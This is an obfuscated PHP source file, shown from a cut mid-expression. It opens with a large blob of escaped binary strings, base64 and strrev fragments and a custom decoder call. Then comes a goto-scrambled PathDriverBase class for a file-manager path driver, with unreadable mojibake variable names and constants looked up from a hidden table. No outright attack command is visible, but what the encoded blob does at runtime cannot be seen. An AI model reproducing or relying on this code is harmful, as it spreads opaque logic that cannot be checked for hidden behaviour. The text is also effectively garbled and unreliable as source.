\272\16\100\22\315\120\105\320\136\6\275\337\374\377\227\0\153\101\137\27\377"."\377\227\2\325\46\334\26\130\207\142\5\113\65\377\253\62\50\203\143\135\205\125\213\346\227\74\315\15\321\110\312\104\41\27\355\144\302\13\360\370\220\205\34\253\150\44\224\42\175\365\60\15\47\231\226"."\143\317\115\43\106\5\6\76\50\274\352\254\333\227\206\260\215\133\223\206\45\50\247\46\243\15\25\333\23\160\37\2\362\216\261\166\300\345\277\250\302\64\332\131\30\23\263\262\104\63\372\12\346\142\14"."\154\103\4\5\142\114\60\311\63\5\23\24\306\261\161\32\103\117\300\165\150\276\226\203\57\43\132\210\267\141\10\103\320\107\162\52\235\364\60\77\264\351\161\41\240\213\63\146\230\17\43\262\174\304\23"."\335\174\77\56\132\205\50\24\146\157\25\64\352\230\117\147\205\236\127\206\13\52\203\67\227\314\22\326\146\224\211\221\101\111\217\121\54\133\327\62\162\301\105\302\47\217\34\141\364\15\316\200\162\170\205"."\150\226\240\37\122\7\340\47\305\62\226\134\106\13\160\100\307\345\211\343\56\342\77\272\262\142\45\141\272\260\42\142\303\301\245\16\337\150\36\324\121\115\200\225\32\354\351\307\154\306\202\256\25\330\70"."\3\337\354\325\325\72\150\200\71\360\40\27\101\304\230\270\210\226\51\302\244\241\300\112\302\105\60\37\240\13\302\104\103\51\240\221\142\353\311\44\74\261\40\61\202\205\266\234\64\13\336\117\322\130\76"."\xa3\xe4\x54\xfa\xbe\x74\x11\x64\x15\x65\xdf\x25\x62\xc6\x25\xf6\x8c\xc\x95\x26\xb\xc7\xef\x62\xd5\xa3\xd8\x30\x8a\x40\x46\xa3\x79\x35\x83\xcf\x53\x90\xa1\x13\x85\x8f\x8d\x3\x8f\x67\xc\xe8\x1c\x28\x21\xc6\xb5\x2c\xbc".base64_decode('hVRYJQ0g1QNuNERxUoaq5myQWKag2gBKJp9WEAQDiEt1T8zlSbk8hstDduO74h/yWKmHrFrEBw==').base64_decode('CnXEjhqIN9vQe0VKS1aEw9u7igl5KtWNcEWetKBiI6DDO2x0bSGkBHVLeMCdvYwHk5IZqurl7w==').base64_decode('Whht7/T3RNEuINAddneWJACeGfZ7ysD8JfSSWseydlU0LYeW+R7uhyNLPX2jZ7CZ00Li/4tkhg==').strrev('ÓÇ÷⁄¥π”«ª∆F-N¡{"‰IìÙËkxÅY,ÀπB®π<)ÜJ≥29∞ò®€QpÃ^w88∂')."\340\62\356\273\22\244\204\335\301\161\122\140\36\342\371\211\72\43\232\273\140\301\2\372\240\153\74\203\344\56\47\264\101\140\167\353\0\12\117\252\324\162\250\122\216\11\165\364\220\275\221\355\156\76\250".base64_decode('GG7cggqJy7X8OIlanr6HRt98V/MFevHNjt4EFxqzyO8o+Y2tJPStGETPIK6Q/JpJztJSK6EeHA==').base64_decode('DYMlJ8PPPJFm8IDkUXLVlhQAaHOlLmjwlEtJK0HLsXNUk9v/m2k1k4lClThS3Xhal0o3mzQ6/g==')."\x37\x78\x31\x4\x5c\xa0\xfa\x1c\x90\x8b\x82\xa\x12\x2a\x24\x53\x5a\xd0\xc\xe0\xb6\xed\xc4\x6\xd0\xe9\x24\x4a\x3e\xd0\x56\x1a\x70\x15\x3b\x12\x72\x37\x47\x8d\xa0\xd1\x11\x43\x14\x30\x3c\xc1\x11\x19\x14\x99\x24\xb8\xc6"."\x20\x3b\x5\x9b\x6b\x89\x45\x7a\x82\xc\x5b\x33\x76\x2b\x91\x50\x47\xe7\x4a\xc8\x59\xa\x71\x71\x5b\xd9\x3f\x9\xfa\x8c\x4\x3e\x3\x4d\xca\x24\xfc\x44\xa1\x4d\x81\x10\x23\x94\x41\x9a\x6d\x7a\x88\x38\xa1\xbc\xc2\xdc\x3f".base64_decode('LI5PrW+oF2ww/B5fKHpcCDq86/RTDxb2BD9ICwfHSXEHx0sJtB03ToqHbizsKZ2BQEj0klJSvQ==')."\336\36\301\313\27\331\70\303\105\275\201\250\211\166\367\166\22\306\26\41\24\35\41\114\332\103\324\241\42\205\251\365\115\324\272\210\277\30\7\373\52\52\274\311\212\217\333\160\130\107\133\67\34\226\342"."\12\66\143\211\251\130\134\120\23\320\303\37\254\235\44\276\24\76\31\272\357\164\271\152\234\323\152\247\114\316\212\260\110\35\4\106\352\134\223\173\111\65\46\163\30\100\230\302\340\256\25\65\125\253\253"."\x6b\x9d\x75\x35\x91\x86\x5a\xa6\xee\x15\xa1\xa6\x6b\xf0\xcd\x71\xac\x2c\x35\xb0\xaa\x69\xd\x77\x26\x16\xe9\x77\xd6\x45\x6\xa6\x8\xda\x67\xab\x0\x60\xd\x3\x8c\xa4\xe9\x59\x1a\xb2\x5d\x67\x58\x66\x5d\x4d\x7f\x55\xf5".base64_decode('gLOuf0UkMgCDtQDWDOGRkLOuVm6d4urVTBEfu0QdF4d0OTVey7OLASjLaGD7hOwjRGXbHh9g0g==')."\202\355\222\225\315\13\144\14\235\50\315\154\22\325\315\61\204\56\61\5\272\50\242\40\265\26\313\163\265\173\273\362\55\213\332\146\117\275\324\6\144\70\251\120\111\251\35\32\0\210\226\125\323\204\202"."\xa2\xa2\x2f\x34\x4\x11\x7d\xf2\xc3\xb8\xf0\x40\xa1\x50\x57\x20\xc8\x9\x6e\x1e\x60\x41\xd4\xff\x9\x91\x10\x14\x33\x3d\x8e\x43\x10\x6c\x92\xf\x1a\x20\xd4\x9\xb1\x1a\x27\x3c\x9\x10\x16\xde\x8e\x12\xc7\x36\x64\x7f\x55"."\xde\x87\x38\xc\x8\x99\x4c\x2d\x84\x7\x3e\x85\x36\x3c\xd4\x53\x1\xd7\x22\x1f\x89\x91\x1e\x80\x7d\x1c\x2d\xf9\x60\x17\xb5\xf1\xce\x8\xfb\x54\xae\x3f\x83\xc4\xc\xae\xc1\x45\xa3\x54\x76\x8a\x2b\x79\x78\xd7\x93\xc0\xa7"."\xea\xa0\xe3\xc9\xb7\x59\xa8\xb7\x7\xfa\x91\x82\x9c\x20\x4a\xcf\x5f\x5\x90\xbf\xdb\x1f\xd\xf9\x97\xfb\xca\x12\xa0\x73\xcf\xca\x29\x60\xfd\xf\xfb\xa9\x5c\x24\xc0\xbb\x3\xc8\x75\x93\xd\xde\xdb\xbd\xa8\x3b\xd0\x57\x9"."\x35\xdc\xd5\xc3\x65\xb\x21\xc9\xe3\xee\xe\x47\x85\xcd\x2a\xde\xc5\x80\xbd\x18\xdb\xc6\x50\x15\xf7\xb8\x11\x9f\xde\x18\x63\xd3\x8c\xb9\x34\xa2\x42\x3e\x99\x29\x54\x6\xc8\x67\xe0\x51\x2e\x14\xc6\x47\x1d\x4c\xe3\x9f\x6e".strrev('Ÿ"Í˚†‹lÀ;~ña=‘)ÀLeπ…F™LŒJi€·‚©eìﬁ<AíßêImÜ…∑‹ºÑ').strrev('É/kÔà*‹wªÅ<0B˜|PØuh~˙gS¥bSTúº√Ññ-#TÄfbCÀ≥Œ˜ºAIQ£').base64_decode('mPCys2B852iQWIuiuGQcmSYkYM3yCgZ8UuP05hlzwH9kSkJDLDx5obfMXKgQY54sSizuqA9ASQ==').strrev('≤<ß=	%'."\n".'|*Rïaäó´ôPò¶&Vq§ö'."\r".'8,≤ÕÙbeº§É·bÅ¶)Ål–Ù'."\0".'∞¶∂£u¥')."\24\221\116\134\306\373\312\242\375\335\350\240\157\274\350\242\163\53\154\320\106\72\327\321\50\11\344\5\171\217\100\21\370\230\202\165\43\267\307\314\160\34\35\272\120\20\354\226\270\11\40\176\162\202\15"."\x2d\x7a\x9b\x82\xc5\xc\xc1\x3c\x4c\x4d\xd0\xa1\x43\xef\x3c\x54\x5c\x4b\x30\x10\x3d\x4\x51\xd1\x80\xa\x77\x16\x4c\xf6\xda\xbc\xe4\x91\x77\xa3\x85\x8f\xd9\x73\x18\xd8\x39\x98\xf8\x2a\x36\xca\xc2\xeb\xc4\x9d\x7\x2\x90"."\x8e\x5f\xa2\x16\x1a\xc9\x5d\x4c\xe1\x47\x2a\xa8\xe7\x43\x77\x22\x51\xa\xe\xeb\xc\x58\xee\xa6\xca\xc9\x7c\x36\x12\x9f\xc8\x60\xe7\x19\xf2\x7\xba\x6b\x6a\xa1\xc4\x64\xf3\x29\xd0\x35\xc6\xbc\xd6\x82\x51\x41\x6b\x72\x97"."\62\312\73\235\105\150\52\243\71\323\26\301\116\327\154\271\31\210\141\215\250\61\306\202\11\123\354\350\161\61\120\33\355\46\366\140\1\61\123\206\56\242\305\102\3\104\376\34\301\366\117\204\57\66\63"."\x7\x74\x74\xbb\x33\x92\xd5\xe2\x52\x67\x60\x21\xdc\x74\x7b\xfd\xa1\x45\x52\x4a\xb5\x24\x2e\xd4\xa0\xdb\x9\xfb\x2c\x46\xe\x21\xd0\x69\x1e\x25\xe2\x18\x7b\x7\x1d\x6\x1d\xe8\xe4\xc3\x21\xba\x8d\x31\xd9\xe\x44\x74\x50"."\247\260\327\354\205\202\361\250\213\305\301\143\23\107\202\231\266\226\340\122\41\240\54\207\370\175\41\17\334\301\330\347\75\2\223\275\215\275\234\61\25\136\0\124\376\166\241\302\167\11\176\206\37\232\10"."\31\264\134\121\63\65\76\245\151\127\215\211\370\145\175\211\232\42\40\100\167\100\334\270\133\67\112\277\123\146\207\314\343\30\207\74\160\143\212\57\235\227\302\231\25\72\174\143\245\154\1\200\276\21\300".base64_decode('6spV4/LUgQu5jWePiOOocLFte22KJIPNoKJR6sdhIUfQv7AjPF5xZdhagj8lVVIZLUEFRPa8Dg==')."\176\60\334\103\224\174\154\165\342\117\320\223\227\173\320\123\75\334\3\43\12\2\21\122\206\107\135\250\2\302\133\343\121\164\247\114\146\232\246\43\113\124\142\316\211\141\376\100\24\77\155\202\243\256\122"."\xa9\x18\x3d\xe9\x8d\xd\x90\x18\x13\x5a\x96\x75\xd1\xe3\x47\xe6\x3d\x17\x9e\x42\xfb\xe8\x83\x89\x4e\x8b\x86\x20\x98\x1b\x9f\xc2\x8c\xf4\x29\x1b\x5a\x59\x1c\x2d\x75\x28\x99\xb6\x89\xc5\xe5\xb8\x20\x4d\xe2\x36\xf2\xc\x41".base64_decode('apHqkRsFrH6D7nrmUU/QsPHkBXP4jo8vm7dsNs0dmsk9uiPJgO+AoLilZ8fKADaj+U5aDebzEA==')."\132\235\344\222\272\330\62\304\305\174\200\133\310\50\204\155\245\145\170\152\155\365\224\276\144\117\262\217\133\226\134\57\127\140\375\66\116\157\143\232\50\42\20\24\262\126\25\134\43\323\137\350\62\207\311"."\x96\xb0\x4e\x82\x10\x42\x2c\x9c\x22\xe4\x97\xf2\xc7\xd2\xa2\xc1\x20\x79\x88\x36\x9\xa5\x44\x18\x2d\x4b\xec\x52\xb9\xfa\x1a\xa9\xab\xcc\x59\x3e\xbe\xa2\x6\x20\xc0\xa\x90\x5\x8f\x40\xda\x34\x4d\xa0\x3\xac\xc6\x1e\xc4".strrev('ÃÜˆÏµt√Çˆ\''."\r".'—kD‘õ±˘»S'."\r".'ˆk!É˙„∂t#Ch´sR9ïoÿú÷')."\x4c\xb1\x48\xea\x5d\x8\xfd\x40\xe1\x1b\x10\x2e\x33\x7a\x76\x95\x7b\x23\x82\x1e\xe0\x98\x68\xc1\x3d\x28\xe\xe9\x48\x82\x75\x8a\xb2\x2f\x41\x90\xe6\x49\x74\xe2\x98\x96\x48\x50\x48\x56\x1\x92\x8a\x8c\x2\x88\x4a\x45\x1"."\xaa\x32\xd4\x46\xa5\x8\x85\xd\x18\x7a\x5b\x8c\x8d\x1d\xec\x51\xf2\xe3\x55\x93\x4c\x74\x84\x71\xbe\xc7\x10\x5d\xe0\xd3\x26\x60\xc2\x28\xfb\x6\xfa\x85\x1b\x68\x19\xb7\x51\x66\xe4\xa2\x99\x9d\x48\x2d\xd1\xc\x61\xe1\x4b".base64_decode('5r6qZXxgj4xfOJfg3UHJPqXyD8IahsWP26S8UgGP9VJJhmBpT4b1ck8J3P1SrpDlfq5AxC7cYg==')."\261\236\372\230\370\221\346\26\214\214\214\124\152\145\372\110\224\214\137\66\224\155\105\240\12\105\55\241\301\114\322\52\31\256\262\217\375\7\245\23\327\73\110\330\5\142\203\333\14\252\374\44\170\131\66".strrev('Å%wj"?Ë\\%e‡P∂y\'˘›¢Q?8ù˙$Zùíº6-√–(ûp‰åÑ45¡úªûª«q∆}8—')."\22\147\22\316\240\130\311\171\316\372\53\175\345\377\137\17\273\357\64\262\223\363\62\51\122\20\375\104\41\225\327\36\277\333\366\237\177\237\312\137\212\335\173\26\112\265\117\140\341\340\100\265\2\320\264"."\235\214\211\40\317\363\127\120\204\125\12\226\345\26\205\324\162\41\233\322\77\127\137\102\336\255\271\27\14\104\44\66\202\141\32\155\206\315\147\64\52\50\214\32\71\136\321\150\227\107\352\113\50\6\335"."\203\43\167\163\356\205\314\377\67\274\43\344\125\200\61\76\331\55\235\247\130\202\203\152\310\36\2\364\334\13\154\23\155\22\42\210\163\233\43\201\356\23\45\100\161\45\27\146\26\240\157\115\220\362\210"."\370\303\305\10\324\120\301\117\17\331\210\362\236\162\223\11\223\220\305\67\35\101\224\21\12\341\313\144\346\41\107\240\370\263\2\27\346\14\227\207\272\251\132\76\214\10\107\52\110\52\143\211\151\121\140"."\203\17\172\330\105\23\126\13\364\32\126\45\232\305\225\200\204\110\226\2\24\324\114\354\32\7\352\355\42\163\131\230\207\364\236\175\246\242\6\375\310\172\2\213\143\216\150\111\104\364\217\55\254\127\370".strrev('@N¶&AN¯ê‹2d†Ü‘¯)∂√6Ù)Ã(∂è°g_NÛ8† ‹-§%¬$b€%î%LA<ì')."\141\103\226\116\37\350\255\20\21\133\131\101\272\316\151\361\241\12\376\167\140\157\103\145\27\201\103\242\53\360\161\320\70\7\151\236\27\143\112\152\64\124\356\250\250\115\20\10\103\304\123\121\331\134\147".base64_decode('5CricX6I4/CBSPs+SvwavpSEe4UgFOud4wx2ZZrSTHwgJUq6ICTWnRJlj6GjlcoOZZsPwZBG0A==').base64_decode('YAmVTmtLt/UCEA+Fw2D88hd+JBY+WwQmtxTq7apBLm8hAHmMQa/HHE8WzuOliZLwP/yGUA1Mhg==')."\205\34\57\371\273\371\213\216\265\22\177\373\106\174\372\26\236\246\264\353\214\202\354\356\272\115\305\166\267\4\50\144\176\45\264\270\156\230\2\232\360\304\310\142\350\150\230\266\26\22\6\313\103\372\133".strrev('Ÿj¨ˆqCˆ±G%#üLâE-ª∂Å‘ë¬AQ˝∂7Åh∫Ènî˛eêﬁ(^ŸÌ|')."\304\55\150\235\102\62\312\105\35\42\202\137\350\256\333\317\375\10\240\144\174\270\344\56\52\114\143\242\64\127\257\115\140\23\216\320\343\210\354\270\44\214\62\306\100\55\321\77\356\274\126\232\303\112\153"."\106\242\115\313\45\112\361\13\271\30\203\162\164\60\30\155\225\300\100\200\250\300\273\222\112\221\37\264\162\261\50\221\150\127\212\25\120\231\155\57\203\2\10\103\105\153\276\360\144\0\367\152\253\216\210"."\254\234\340\45\313\253\3\21\313\241\374\111\201\322\126\241\51\301\340\344\154\73\47\370\365\42\104\305\101\370\125\145\346\270\15\27\145\350\50\243\222\340\36\335\160\35\331\76\204\177\322\376\362\1\103"."\x63\xf2\x8\xc0\x41\x2a\xd0\xe\x1b\xb4\xc4\xb1\x2e\x3c\x9b\xa1\x8b\x4a\x49\x12\xd9\x4\x9\xc5\x57\xdc\x2b\xd9\x6\xbc\x53\x28\x4e\x3c\x5e\x1f\x37\x43\xa8\xf2\x47\x38\x55\xda\xbb\x38\x54\x72\xa8\x5f\xc2\x1d\x39\x32\x11".strrev('Ω+.–“È¸©‰å˙ 0Á∂î3-%´„	=∑4‡î`b≠9uí7ñ*∂âä¡,k\'x€%m')."\274\342\205\10\307\106\145\67\153\141\275\102\36\134\243\212\331\160\22\314\311\5\26\133\136\161\133\307\263\301\207\302\315\161\152\130\336\176\64\73\112\132\117\352\314\235\132\13\250\343\165\111\105\344\362".strrev('ÿﬁ,ñVc¶–h´ÑÀÜ…p´O(Y µØ∆∆JhÊƒ´\'π.«≠«ëØ≠∏®µ µ[F≈/Òëœ')."\125\276\323\13\126\234\210\246\375\262\255\4\56\166\14\325\16\330\276\366\264\235\133\67\370\173\44\32\20\301\66\306\133\310\15\345\250\313\36\360\5\356\10\221\175\205\12\145\45\236\136\51\105\346\12"."\202\167\321\212\256\142\145\270\257\53\337\70\145\250\337\46\164\124\6\366\353\132\134\270\262\207\100\321\377\53\116\147\47\12\170\25\307\327\63\136\121\15\25\125\113\203\257\363\262\53\60\333\175\117\205"."\164\47\77\76\23\35\370\332\174\11\103\24\57\63\111\306\213\57\71\114\304\147\340\110\275\202\100\332\306\340\36\101\306\153\32\116\16\351\206\5\115\225\1\337\315\243\337\66\335\262\50\73\0\302\51"."\302\104\202\30\362\204\42\134\366\201\220\244\10\116\165\15\164\216\211\10\22\61\16\24\44\247\361\160\367\24\122\161\52\142\106\266\10\74\37\145\21\161\335\31\322\23\61\175\224\214\53\172\242\200\177".base64_decode('DR5TkkaXilLcNz6hJfFiEmn7mC6c4iKawg5UhoM8aMU0g0j2BJoezDvij5VAzoN4EfhRUHRyAQ==')."\xdf\xd2\xf5\x2d\xf5\x87\xc2\xa1\xb2\xa4\x1e\x77\x28\xd4\x17\x8\x7a\xb1\x76\x61\x59\x32\xca\x25\xdc\x2\x97\x25\xf5\x74\x4\xba\xc7\x4b\xf3\x75\xb9\xfd\x9d\x65\x69\xf0\x56\x18\xea\x3c\xd2\xc7\xd6\x70\x92\xbf\x7\xd5\xd2"."\xdd\xd9\x49\x55\x8c\xca\x6b\xe1\xf7\x2c\xe2\x35\x41\x17\x1e\xfc\x60\x2f\x9f\xd6\x73\x2\x95\xa\xea\xf\xf4\x34\x33\xa4\xd0\x9\x1\x59\x38\x9d\x36\x62\x58\xcd\xb2\x53\x14\xa1\x38\xfb\x6\x57\x1c\x72\x93\x3e\x6\xc8\x2".strrev('í9,UQ'."\0".'"™∏ß# äh‡ªo≤ÒóüÅÓ®új)2fÏŸU˜¬'."\0".'ùH,)7n-·ÆX_i2˘')._kodDe('MNcdDEbEAODgC9nP8vLLYUljCh4BtZbxcroxWpU4Couqz7X0APaET9kzE/dmCAKaZjpbefoDdeE=')."\x19\x2b\xb1\x94\x14\xbd\x6c\x2d\xe5\xb9\xc2\xed\x22\xec\xaf\xff\x3\x9d\xea\x36\xbd\x41\xbc\x0\x0".strrev('').""."", 10, -8))); goto Aê‰Íã®ïê; a∏àóÛ÷˘†: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $FÀá‚æÿÑı =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->objectDriver = array($FÀá‚æÿÑı[57], $FÀá‚æÿÑı[58], $FÀá‚æÿÑı[59], $FÀá‚æÿÑı[60], $FÀá‚æÿÑı[61], $FÀá‚æÿÑı[62], $FÀá‚æÿÑı[63], $FÀá‚æÿÑı[64], $FÀá‚æÿÑı[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($C∫Ì¬ó Áà) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($C∫Ì¬ó Áà, $_SERVER[£¿ÌÙëü¡¯¯][8]); } return $C∫Ì¬ó Áà; } public function getPathName($B·Í¢«¨æ“) { return $B·Í¢«¨æ“; } public function iconvApp($fãˆçë§∑¡) { return $fãˆçë§∑¡; } public function iconvSystem($C∏ê˘àÚå÷) { return $C∏ê˘àÚå÷; } public function iconvTo($Déú¥⁄ıØ, $C®°ˆâè⁄⁄, $Cü”¬ô‰Éû) { goto dØ‹∂§¯Üı; aƒæ≤‡å—ù: $EŒçúπ âã = $C®°ˆâè⁄⁄ . $bÍ∑ñßà«ä[67] . $Cü”¬ô‰Éû . $bÍ∑ñßà«ä[68] . $Déú¥⁄ıØ; if (isset($B§Â°ÙÙ‘≠[$EŒçúπ âã])) { return $B§Â°ÙÙ‘≠[$EŒçúπ âã]; } if (function_exists($bÍ∑ñßà«ä[69])) { $dó®úß◊·‹ = @mb_convert_encoding($Déú¥⁄ıØ, $Cü”¬ô‰Éû, $C®°ˆâè⁄⁄); } else { $dó®úß◊·‹ = @iconv($C®°ˆâè⁄⁄, $Cü”¬ô‰Éû, $Déú¥⁄ıØ); } goto F£ÕåÂ≈Ãƒ; DÃç†äàóÉ: return $dó®úß◊·‹; goto füäÕ‹ íí; C¬¨åŸäº”: $B§Â°ÙÙ‘≠[$Cü”¬ô‰Éû . $bÍ∑ñßà«ä[67] . $C®°ˆâè⁄⁄ . $bÍ∑ñßà«ä[68] . $Déú¥⁄ıØ] = $Déú¥⁄ıØ; $B§Â°ÙÙ‘≠[$Cü”¬ô‰Éû . $bÍ∑ñßà«ä[67] . $C®°ˆâè⁄⁄ . $bÍ∑ñßà«ä[68] . $dó®úß◊·‹] = $Déú¥⁄ıØ; $B§Â°ÙÙ‘≠[$C®°ˆâè⁄⁄ . $bÍ∑ñßà«ä[67] . $Cü”¬ô‰Éû . $bÍ∑ñßà«ä[68] . $dó®úß◊·‹] = $dó®úß◊·‹; goto DÃç†äàóÉ; F£ÕåÂ≈Ãƒ: $dó®úß◊·‹ = $dó®úß◊·‹ ? $dó®úß◊·‹ : $Déú¥⁄ıØ; if (strstr($dó®úß◊·‹, $bÍ∑ñßà«ä[70])) { $dó®úß◊·‹ = str_replace($bÍ∑ñßà«ä[70], $bÍ∑ñßà«ä[71], $dó®úß◊·‹); } $B§Â°ÙÙ‘≠[$C®°ˆâè⁄⁄ . $bÍ∑ñßà«ä[67] . $Cü”¬ô‰Éû . $bÍ∑ñßà«ä[68] . $Déú¥⁄ıØ] = $dó®úß◊·‹; goto C¬¨åŸäº”; dØ‹∂§¯Üı: $bÍ∑ñßà«ä =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$Déú¥⁄ıØ || !function_exists($bÍ∑ñßà«ä[66])) { return $Déú¥⁄ıØ; } static $B§Â°ÙÙ‘≠ = array(); goto aƒæ≤‡å—ù; füäÕ‹ íí: } public function getPathInner($fßÿ⁄—ï€ı) { $A⁄ë˜•Ñüß = IO::init($fßÿ⁄—ï€ı); return $A⁄ë˜•Ñüß->path; } public function getPathOuter($f›Î‚Æï”ç) { $Fã°óÙæ·î =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eø≥…öß”∞ = strlen(trim($this->pathBase, $Fã°óÙæ·î[8])); $f›Î‚Æï”ç = substr(trim($f›Î‚Æï”ç, $Fã°óÙæ·î[8]), $Eø≥…öß”∞); return $this->pathDriver . $Fã°óÙæ·î[8] . ltrim($f›Î‚Æï”ç, $Fã°óÙæ·î[8]); } public function isParentOf($BÑ◊ÑÚÜ¶´, $DµŒ≤çñÉ¢) { $DÇ‹§¨Ì§é =& $_SERVER[£¿ÌÙëü¡¯¯]; $BÑ◊ÑÚÜ¶´ = rtrim(strtolower($BÑ◊ÑÚÜ¶´), $DÇ‹§¨Ì§é[8]) . $DÇ‹§¨Ì§é[8]; $DµŒ≤çñÉ¢ = rtrim(strtolower($DµŒ≤çñÉ¢), $DÇ‹§¨Ì§é[8]) . $DÇ‹§¨Ì§é[8]; $fàñò»®ÍÎ = strpos($DµŒ≤çñÉ¢, $BÑ◊ÑÚÜ¶´) === 0; return $fàñò»®ÍÎ; } public function getType() { $FÔ˜º”ì∆â =& $_SERVER[£¿ÌÙëü¡¯¯]; $BΩŒ®˘èîÔ = str_replace($FÔ˜º”ì∆â[72], $FÔ˜º”ì∆â[33], get_class($this)); return strtolower($BΩŒ®˘èîÔ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($D˘Ü‘íë÷°, $F¥¬Ëç∂Ø®) { $a’À“‹¬ıΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fŸ•â∆…®Ô = rtrim($D˘Ü‘íë÷°, $a’À“‹¬ıΩ[8]) . $a’À“‹¬ıΩ[8] . $F¥¬Ëç∂Ø®; $A’Æ÷…˜∑ë = $this->exist($fŸ•â∆…®Ô); return $A’Æ÷…˜∑ë ? $fŸ•â∆…®Ô : !1; } public function renameObject($fàéáìÂÌµ, $cÌÆ’Ñ°ñú) { goto Fç‹œ√ı∞¯; Fç‹œ√ı∞¯: $cé“„É“ ˆ =& $_SERVER[£¿ÌÙëü¡¯¯]; $D…Îˆ…ì‘Â = $cÌÆ’Ñ°ñú; Hook::trigger($cé“„É“ ˆ[73], $this, $fàéáìÂÌµ, $this, $this->pathFather($fàéáìÂÌµ) . $cÌÆ’Ñ°ñú); goto AΩàÜÑ∆•õ; B¨ä“∞…œú: return $Dà¬ß›˘Áê ? $cÌÆ’Ñ°ñú : !1; goto a√•ê¶óéÓ; AΩàÜÑ∆•õ: $fàéáìÂÌµ = $this->getPathOuter($fàéáìÂÌµ); $cÌÆ’Ñ°ñú = $this->pathFather($fàéáìÂÌµ) . $cÌÆ’Ñ°ñú; if (IO::isFile($fàéáìÂÌµ)) { $Dà¬ß›˘Áê = IO::copy($fàéáìÂÌµ, $this->pathFather($fàéáìÂÌµ), REPEAT_RENAME_FOLDER, $D…Îˆ…ì‘Â); if ($Dà¬ß›˘Áê) { IO::remove($fàéáìÂÌµ); } } else { $Dà¬ß›˘Áê = IO::mkdir($cÌÆ’Ñ°ñú); if (!$Dà¬ß›˘Áê) { return !1; } $DÀ—‰˘€ìÉ = IO::listPath($fàéáìÂÌµ, !0); $Dç‡ÔÍ®±◊ = array_merge($DÀ—‰˘€ìÉ[$cé“„É“ ˆ[74]], $DÀ—‰˘€ìÉ[$cé“„É“ ˆ[75]]); foreach ($Dç‡ÔÍ®±◊ as $BÌ÷‡Áùì…) { IO::move($BÌ÷‡Áùì…[$cé“„É“ ˆ[76]], $cÌÆ’Ñ°ñú, REPEAT_RENAME_FOLDER); } IO::remove($fàéáìÂÌµ); } goto B¨ä“∞…œú; a√•ê¶óéÓ: } public function tempFile($dﬂº∏‰óÉ• = '', $c¡¢¿ƒóíÃ = '') { goto Eﬁç ≤‘˜≠; EÊêàÍæœı: return $D∞ô”‚ê…Œ; goto D«·¥›”‡«; Eﬁç ≤‘˜≠: if (!$dﬂº∏‰óÉ•) { $dﬂº∏‰óÉ• = rand_string(15); } $f‘‘•’ï„ï = TEMP_FILES . rand_string(15) . $_SERVER[£¿ÌÙëü¡¯¯][8]; @mkdir($f‘‘•’ï„ï, 511, !0); goto aÊùÇ∂¥∂≥; aÊùÇ∂¥∂≥: $D∞ô”‚ê…Œ = $f‘‘•’ï„ï . $dﬂº∏‰óÉ•; @touch($D∞ô”‚ê…Œ); if ($c¡¢¿ƒóíÃ) { file_put_contents($D∞ô”‚ê…Œ, $c¡¢¿ƒóíÃ); } goto EÊêàÍæœı; D«·¥›”‡«: } public function tempFileRemve($eÂöº ≥µµ) { @unlink($eÂöº ≥µµ); @rmdir($this->pathFather($eÂöº ≥µµ)); } public function mkfile($bëÿ¨ıÆø, $e®∆Ñäﬂé = '', $fé≥±ŸâÁÕ = REPEAT_RENAME) { } public function mkdir($Fƒí≠ˆöÑ®, $CÁΩÏÊ˘Ï˘ = REPEAT_SKIP) { } public function copyFile($EâÜã»ÁÁî, $a‡¢¥˜¿Éª) { } public function moveFile($C¶ú◊›Ωàπ, $fΩÇ¬‚Èµè) { } public function remove($C‡Çù«√ì«) { if ($this->isFile($C‡Çù«√ì«)) { return $this->delFile($C‡Çù«√ì«); } return $this->delFolder($C‡Çù«√ì«); } public function rename($fÍµ§ëê·ì, $cµÂ«â˘æÊ) { } public function exist($DÓ‡Éç‚ïÙ) { } public function findByHash($B˘ˆÁÊ©Êë = '', $d®≠úóŒ®» = '') { return !1; } public function isFile($CãØ«ÛÀü√) { } public function isFolder($aê©£Ÿ…â∏) { } public function size($fßÂ–ˆÒ°≥) { } public function info($Aø™∆àá©¡) { } public function infoSimple($AàëÜÒ¯àÇ) { return $this->info($AàëÜÒ¯àÇ); } public function infoAuth($cá±†“á≠à) { return $this->info($cá±†“á≠à); } public function infoFull($f—·“ëêÚÒ) { return $this->info($f—·“ëêÚÒ); } public function infoWithChildren($A¿ˆ±ôﬂËñ) { $få”ˆÆÿíÉ =& $_SERVER[£¿ÌÙëü¡¯¯]; $BéÁÀ•ãî… = $this->info($A¿ˆ±ôﬂËñ); if ($BéÁÀ•ãî… && $BéÁÀ•ãî…[$få”ˆÆÿíÉ[29]] == $få”ˆÆÿíÉ[77]) { $c…ŒºâÁ£ø = array($få”ˆÆÿíÉ[78] => 0, $få”ˆÆÿíÉ[79] => 0, $få”ˆÆÿíÉ[80] => 0); $this->infoChildren($A¿ˆ±ôﬂËñ, $c…ŒºâÁ£ø); $BéÁÀ•ãî…[$få”ˆÆÿíÉ[78]] = $c…ŒºâÁ£ø[$få”ˆÆÿíÉ[78]]; $BéÁÀ•ãî…[$få”ˆÆÿíÉ[81]] = array($få”ˆÆÿíÉ[82] => $c…ŒºâÁ£ø[$få”ˆÆÿíÉ[79]], $få”ˆÆÿíÉ[83] => $c…ŒºâÁ£ø[$få”ˆÆÿíÉ[80]]); } return $BéÁÀ•ãî…; } public function listPath($E≤˜åå⁄‡›, $FŸ†Ÿ¥°á§ = false) { } public function has($AÓ∫Îì™•ó, $aˆ–¨Â◊ŒÜ = false, $açØÈÎõ° = false) { } public function canRead($C∆‘¿¶›≠Ü) { } public function canWrite($A∂∫¨—‘Úè) { } public function getContent($aœŸΩ≈ÆóŸ) { } public function setContent($eä´ØçÁ©ê, $Bòœ·áÆΩ· = '') { } protected function infoChildren($F‚£áøò’›, &$Eç≈ëÁÙ à) { $F”äŸ∏»ô€ =& $_SERVER[£¿ÌÙëü¡¯¯]; check_abort(); $C±∆∆”ÿ†â = $this->listPath($F‚£áøò’›, !0); $C±∆∆”ÿ†â = array_merge($C±∆∆”ÿ†â[$F”äŸ∏»ô€[75]], 